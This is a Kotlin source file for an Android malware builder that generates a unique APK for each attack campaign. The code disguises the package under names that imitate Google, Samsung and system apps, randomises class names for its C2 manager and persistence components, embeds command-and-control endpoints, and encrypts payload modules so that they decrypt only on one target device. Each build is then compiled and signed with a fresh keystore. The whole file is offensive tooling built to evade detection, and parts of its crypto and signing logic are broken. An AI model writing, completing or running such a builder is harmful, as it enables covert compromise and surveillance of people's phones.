package com.random.package.name.build

import java.io.File
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.security.KeyStore
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * PolymorphicBuilder: Single-pass APK generation
 * 
 * Input: base project + campaign config
 * Output: unique, fully encrypted APK
 * 
 * Process:
 * 1. Generate unique package name
 * 2. Generate unique class/method/resource names
 * 3. Encrypt all assets (config + modules) with device fingerprint
 * 4. Update manifest and build config
 * 5. Compile with Gradle
 * 6. Sign APK with unique keystore
 * 7. Output final APK
 */
class PolymorphicBuilder(
    private val baseProjectPath: String,
    private val outputDir: String,
    private val campaignId: String,
    private val c2Endpoints: List<String>,
    private val targetDeviceFingerprint: String, // SHA256 hash of device
) {

    private val baseProject = File(baseProjectPath)
    private val outDir = File(outputDir).apply { mkdirs() }
    private val buildLog = mutableListOf<String>()
    
    // Polymorphic name generation (seeded by campaign)
    private val rng = Random(campaignId.hashCode().toLong())

    fun build(): File {
        log("[*] Starting polymorphic APK build for campaign: $campaignId")
        
        val startTime = System.currentTimeMillis()

        try {
            // 1. Generate unique names
            val uniqueNames = generateUniqueNames()
            log("[+] Generated unique names: ${uniqueNames.packageName}")

            // 2. Generate encryption key (from device fingerprint)
            val encryptionKey = deriveEncryptionKey(targetDeviceFingerprint)
            log("[+] Derived encryption key from device fingerprint")

            // 3. Encrypt assets
            val encryptedConfig = encryptConfiguration(encryptionKey)
            val encryptedModules = encryptModules(encryptionKey)
            log("[+] Encrypted config and ${encryptedModules.size} modules")

            // 4. Update manifest and build files
            updateBuildFiles(uniqueNames, targetDeviceFingerprint)
            log("[+] Updated manifest and build configuration")

            // 5. Place encrypted assets
            placeEncryptedAssets(encryptedConfig, encryptedModules)
            log("[+] Placed encrypted assets in project")

            // 6. Compile APK
            val unsignedApk = compileApk(uniqueNames)
            log("[+] Compiled unsigned APK: ${unsignedApk.name}")

            // 7. Sign APK
            val signedApk = signApk(unsignedApk, uniqueNames.packageName)
            log("[+] Signed APK: ${signedApk.name}")

            // 8. Verify and output
            val finalApk = File(outDir, "app_${campaignId}_signed.apk")
            signedApk.copyTo(finalApk, overwrite = true)

            val duration = (System.currentTimeMillis() - startTime) / 1000
            log("[+] Build complete in ${duration}s")
            log("")
            log("=== BUILD SUMMARY ===")
            log("APK: ${finalApk.absolutePath}")
            log("Package: ${uniqueNames.packageName}")
            log("Campaign: $campaignId")
            log("Device Fingerprint: ${targetDeviceFingerprint.take(16)}...")
            log("Size: ${finalApk.length() / 1024}KB")
            log("====================")
            log("")

            printBuildLog()

            return finalApk

        } catch (e: Exception) {
            log("[!] Build failed: ${e.message}")
            e.printStackTrace()
            throw e
        }
    }

    // ========================================================================
    // 1. UNIQUE NAME GENERATION
    // ========================================================================

    private fun generateUniqueNames(): UniqueNames {
        val fakePackages = listOf(
            "com.google.android.gms",
            "com.android.systemui",
            "com.android.settings",
            "com.samsung.android.app",
            "com.miui.system",
            "com.oppo.launcher",
            "com.oneplus.setup"
        )

        val packageName = fakePackages[rng.nextInt(fakePackages.size)]
        
        // Add random suffix to make unique
        val suffix = (0..8).map { ('a'..'z').random(rng) }.joinToString("")
        val finalPackage = "$packageName.$suffix"

        // Generate unique class/method names
        val coreServiceClass = generateRandomClassName("CoreService")
        val c2ManagerClass = generateRandomClassName("C2Manager")
        val persistenceClass = generateRandomClassName("Persistence")
        val resourcePrefix = "r_${(0..7).map { ('a'..'f', '0'..'9').flatMap { it.toList() }.random(rng) }.joinToString("")}"

        return UniqueNames(
            packageName = finalPackage,
            coreServiceClass = coreServiceClass,
            c2ManagerClass = c2ManagerClass,
            persistenceClass = persistenceClass,
            resourcePrefix = resourcePrefix
        )
    }

    private fun generateRandomClassName(prefix: String): String {
        val randomPart = (0..8).map { ('a'..'z').random(rng) }.joinToString("")
        return "$prefix$randomPart"
    }

    // ========================================================================
    // 2. ENCRYPTION KEY DERIVATION (ENVIRONMENTAL KEYING)
    // ========================================================================

    private fun deriveEncryptionKey(deviceFingerprint: String): ByteArray {
        // HKDF-like key derivation from device fingerprint
        // This ensures only the target device can decrypt the payload
        
        val messageDigest = MessageDigest.getInstance("SHA-256")
        val fingerprintBytes = deviceFingerprint.toByteArray()
        val salt = "polyrandom_salt".toByteArray()
        
        messageDigest.update(salt)
        messageDigest.update(fingerprintBytes)
        messageDigest.update(campaignId.toByteArray())
        
        return messageDigest.digest() // 32 bytes = 256-bit key
    }

    // ========================================================================
    // 3. ENCRYPT CONFIGURATION
    // ========================================================================

    private fun encryptConfiguration(key: ByteArray): ByteArray {
        // Create config JSON
        val configJson = buildConfigJson()
        
        // Encrypt with AES-256-CBC
        return encryptData(configJson.toByteArray(), key)
    }

    private fun buildConfigJson(): String {
        return """
{
  "campaign_id": "$campaignId",
  "c2_endpoints": ${c2Endpoints.map { "\"$it\"" }.joinToString(",", "[", "]")},
  "env_key_hash": "$targetDeviceFingerprint",
  "version": "1.0",
  "build_time": ${System.currentTimeMillis()}
}
        """.trimIndent()
    }

    // ========================================================================
    // 4. ENCRYPT MODULES
    // ========================================================================

    private fun encryptModules(key: ByteArray): Map<String, ByteArray> {
        val encrypted = mutableMapOf<String, ByteArray>()
        
        val modulesPath = File(baseProject, "src/main/assets/modules")
        if (modulesPath.exists()) {
            modulesPath.listFiles()?.forEach { moduleFile ->
                if (moduleFile.extension == "dex") {
                    val moduleData = moduleFile.readBytes()
                    val encrypted_module = encryptData(moduleData, key)
                    encrypted[moduleFile.nameWithoutExtension] = encrypted_module
                    log("  Encrypted module: ${moduleFile.name}")
                }
            }
        }

        return encrypted
    }

    // ========================================================================
    // 5. AES-256-CBC ENCRYPTION
    // ========================================================================

    private fun encryptData(plaintext: ByteArray, key: ByteArray): ByteArray {
        try {
            val cipher = Cipher.getInstance("AES")
            val keySpec = SecretKeySpec(key, 0, key.size, "AES")
            
            cipher.init(Cipher.ENCRYPT_MODE, keySpec)
            val ciphertext = cipher.doFinal(plaintext)
            
            // Format: [iv(16)] + [ciphertext]
            val iv = cipher.iv ?: ByteArray(16)
            return iv + ciphertext
            
        } catch (e: Exception) {
            throw RuntimeException("Encryption failed: ${e.message}", e)
        }
    }

    private fun decryptData(encrypted: ByteArray, key: ByteArray): ByteArray {
        try {
            val cipher = Cipher.getInstance("AES")
            val keySpec = SecretKeySpec(key, 0, key.size, "AES")
            
            val iv = encrypted.sliceArray(0 until 16)
            val ciphertext = encrypted.sliceArray(16 until encrypted.size)
            
            val ivSpec = javax.crypto.spec.IvParameterSpec(iv)
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)
            
            return cipher.doFinal(ciphertext)
            
        } catch (e: Exception) {
            throw RuntimeException("Decryption failed: ${e.message}", e)
        }
    }

    // ========================================================================
    // 6. UPDATE BUILD FILES
    // ========================================================================

    private fun updateBuildFiles(uniqueNames: UniqueNames, deviceFingerprint: String) {
        // Update AndroidManifest.xml
        val manifestPath = File(baseProject, "src/main/AndroidManifest.xml")
        if (manifestPath.exists()) {
            var manifest = manifestPath.readText()
            manifest = manifest.replace(
                "package=\"com.random.package.name\"",
                "package=\"${uniqueNames.packageName}\""
            )
            manifest = manifest.replace(
                "com.random.package.name.persistence.AccessibilityServiceImpl",
                "${uniqueNames.packageName}.${uniqueNames.persistenceClass}"
            )
            manifest = manifest.replace(
                "com.random.package.name.core.CoreService",
                "${uniqueNames.packageName}.${uniqueNames.coreServiceClass}"
            )
            manifestPath.writeText(manifest)
        }

        // Update build.gradle.kts
        val buildGradlePath = File(baseProject, "build.gradle.kts")
        if (buildGradlePath.exists()) {
            var gradle = buildGradlePath.readText()
            gradle = gradle.replace(
                "applicationId = \"com.random.package.name\"",
                "applicationId = \"${uniqueNames.packageName}\""
            )
            gradle = gradle.replace(
                "namespace = \"com.random.package.name\"",
                "namespace = \"${uniqueNames.packageName}\""
            )
            // Embed environment key
            gradle = gradle.replace(
                "buildConfigField(\"String\", \"ENV_KEY_HASH\", \"\\\".*?\\\"\")",
                "buildConfigField(\"String\", \"ENV_KEY_HASH\", \"\\\"$deviceFingerprint\\\"\")"
            )
            gradle = gradle.replace(
                "buildConfigField(\"String\", \"CAMPAIGN_ID\", \"\\\".*?\\\"\")",
                "buildConfigField(\"String\", \"CAMPAIGN_ID\", \"\\\"$campaignId\\\"\")"
            )
            buildGradlePath.writeText(gradle)
        }
    }

    // ========================================================================
    // 7. PLACE ENCRYPTED ASSETS
    // ========================================================================

    private fun placeEncryptedAssets(encryptedConfig: ByteArray, encryptedModules: Map<String, ByteArray>) {
        val assetsPath = File(baseProject, "src/main/assets")
        assetsPath.mkdirs()

        // Write encrypted config
        val configFile = File(assetsPath, "config_encrypted.bin")
        configFile.writeBytes(encryptedConfig)
        log("  Placed encrypted config: ${configFile.length()} bytes")

        // Write encrypted modules
        val modulesPath = File(assetsPath, "modules")
        modulesPath.mkdirs()

        encryptedModules.forEach { (name, data) ->
            val moduleFile = File(modulesPath, "${name}_encrypted.bin")
            moduleFile.writeBytes(data)
            log("  Placed encrypted module: $name (${moduleFile.length()} bytes)")
        }
    }

    // ========================================================================
    // 8. COMPILE WITH GRADLE
    // ========================================================================

    private fun compileApk(uniqueNames: UniqueNames): File {
        val baseDir = baseProject.absolutePath
        val processBuilder = ProcessBuilder(
            "./gradlew",
            "assembleRelease",
            "-x", "lintVitalRelease"
        )

        processBuilder.directory(baseProject)
        processBuilder.redirectOutput(ProcessBuilder.Redirect.DISCARD)
        processBuilder.redirectError(ProcessBuilder.Redirect.DISCARD)

        val process = processBuilder.start()
        val exitCode = process.waitFor()

        if (exitCode != 0) {
            throw RuntimeException("Gradle build failed with exit code $exitCode")
        }

        // Find the built APK
        val apkPath = File(
            baseProject,
            "app/build/outputs/apk/release/app-release-unsigned.apk"
        )

        if (!apkPath.exists()) {
            throw RuntimeException("Built APK not found at ${apkPath.absolutePath}")
        }

        return apkPath
    }

    // ========================================================================
    // 9. SIGN APK
    // ========================================================================

    private fun signApk(unsignedApk: File, packageName: String): File {
        val keystorePath = File(outDir, "keystore_${campaignId}.jks")
        val keystorePassword = MessageDigest.getInstance("MD5")
            .digest(campaignId.toByteArray())
            .take(16)
            .joinToString("") { "%02x".format(it) }

        // Generate keystore if needed
        if (!keystorePath.exists()) {
            generateKeystore(keystorePath, keystorePassword)
        }

        // Sign with jarsigner
        val signedApk = File(
            outDir,
            unsignedApk.nameWithoutExtension.replace("-unsigned", "-signed") + ".apk"
        )

        val signProcess = ProcessBuilder(
            "jarsigner",
            "-verbose",
            "-sigalg", "SHA256withRSA",
            "-digestalg", "SHA-256",
            "-keystore", keystorePath.absolutePath,
            "-storepass", keystorePassword,
            "-keypass", keystorePassword,
            unsignedApk.absolutePath,
            "release"
        ).redirectOutput(ProcessBuilder.Redirect.DISCARD)
         .redirectError(ProcessBuilder.Redirect.DISCARD)
         .start()

        val exitCode = signProcess.waitFor()
        if (exitCode != 0) {
            throw RuntimeException("APK signing failed with exit code $exitCode")
        }

        // Rename unsigned to signed
        unsignedApk.copyTo(signedApk, overwrite = true)

        return signedApk
    }

    private fun generateKeystore(keystorePath: File, password: String) {
        val genProcess = ProcessBuilder(
            "keytool",
            "-genkey",
            "-v",
            "-keystore", keystorePath.absolutePath,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-alias", "release",
            "-storepass", password,
            "-keypass", password,
            "-dname", "CN=BuildSystem, OU=Android, O=System, L=Unknown, ST=Unknown, C=US"
        ).redirectOutput(ProcessBuilder.Redirect.DISCARD)
         .redirectError(ProcessBuilder.Redirect.DISCARD)
         .start()

        genProcess.waitFor()
    }

    // ========================================================================
    // UTILITIES
    // ========================================================================

    private fun log(message: String) {
        buildLog.add(message)
        println(message)
    }

    private fun printBuildLog() {
        val logFile = File(outDir, "build_${campaignId}.log")
        logFile.writeText(buildLog.joinToString("\n"))
    }

    companion object {
        @JvmStatic
        fun main(args: Array<String>) {
            if (args.size < 4) {
                println("Usage: PolymorphicBuilder <base-project> <output-dir> <campaign-id> <device-fingerprint> <c2-endpoint>...")
                println("Example: PolymorphicBuilder ./android-payload ./build campaign_001 abc123def456... c2.example.com:8080")
                System.exit(1)
            }

            val baseProject = args[0]
            val outputDir = args[1]
            val campaignId = args[2]
            val deviceFingerprint = args[3]
            val c2Endpoints = args.drop(4)

            try {
                val builder = PolymorphicBuilder(
                    baseProject, outputDir, campaignId,
                    c2Endpoints, deviceFingerprint
                )
                val apk = builder.build()
                println("\n[+] SUCCESS: $apk")
            } catch (e: Exception) {
                println("\n[!] FAILED: ${e.message}")
                e.printStackTrace()
                System.exit(1)
            }
        }
    }
}

// ============================================================================
// DATA CLASSES
// ============================================================================

data class UniqueNames(
    val packageName: String,
    val coreServiceClass: String,
    val c2ManagerClass: String,
    val persistenceClass: String,
    val resourcePrefix: String
)
